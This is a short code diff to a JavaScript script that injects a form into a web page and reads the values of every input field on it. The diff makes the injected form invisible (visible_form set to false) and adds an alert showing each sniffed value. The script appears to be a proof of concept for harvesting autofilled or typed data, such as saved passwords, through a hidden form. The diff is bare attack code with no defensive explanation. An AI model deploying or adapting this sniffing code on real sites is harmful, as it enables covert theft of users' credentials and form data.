@@ -23,6 +23,7 @@ var injectForm = function(visible) {
 
 var printResult = function(elementId, sniffedValue){
   console.log("omri:" + sniffedValue );
+  alert(sniffedValue);
 };
 
 var sniffInputField = function(fieldId){
@@ -37,7 +38,6 @@ var sniffInputField = function(fieldId){
 var sniffInputFields = function(){  
   var inputs = document.getElementsByTagName('input');
   for (var i = 0; i < inputs.length; i++) {
-    console.log("Will try to sniff element with id: " + inputs[i].id + "   :   " + i + "    : value:" + inputs[i].value);
     sniffInputField(inputs[i].id);
 	
   }
@@ -48,5 +48,5 @@ var sniffFormInfo = function(visible) {
   sniffInputFields();
 };
 
-var visible_form=true;  
+var visible_form=false;  
 sniffFormInfo(visible_form);
